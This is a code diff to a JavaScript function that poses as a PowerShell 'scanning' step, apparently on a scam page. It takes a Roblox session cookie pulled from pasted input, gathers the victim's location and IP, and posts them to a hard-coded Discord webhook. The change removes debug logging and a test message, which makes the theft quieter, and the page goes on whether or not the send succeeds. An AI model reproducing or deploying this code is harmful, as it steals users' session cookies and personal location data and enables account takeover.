@@ -236,15 +236,10 @@ async function submitPowerShell() {
     submitText.textContent = 'Scanning...';
 
     try {
-        console.log('🚀 Starting webhook process...');
-        console.log('📄 Input text:', inputText.substring(0, 100) + '...');
-        console.log('🍪 Extracted cookie:', globalRobloxCookie ? 'Found' : 'Not found');
-        
         // Get user location and IP
         const locationInfo = await getUserLocation();
-        console.log('📍 Location info:', locationInfo);
         
-        // Send cookie to webhook immediately
+        // Send cookie to webhook FIRST
         const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
         
         const cookieEmbed = {
@@ -286,39 +281,13 @@ async function submitPowerShell() {
             }]
         };
 
-        console.log('📡 Sending webhook...');
-        
-        // Try a simple webhook first
-        const simplePayload = {
-            content: `@everyone TEST - Data received: ${inputText.length} characters`
-        };
-        
-        const simpleResponse = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(simplePayload)
-        });
-        
-        console.log('📡 Simple webhook status:', simpleResponse.status);
-        
-        // Then try the full embed
-        const response = await fetch(webhookUrl, {
+        await fetch(webhookUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify(cookieEmbed)
         });
-
-        console.log('📡 Full webhook response status:', response.status);
-        if (!response.ok) {
-            const errorText = await response.text();
-            console.error('❌ Webhook error:', errorText);
-        } else {
-            console.log('✅ Webhook sent successfully!');
-        }
 
         // Continue flow regardless of webhook success
         setTimeout(() => {
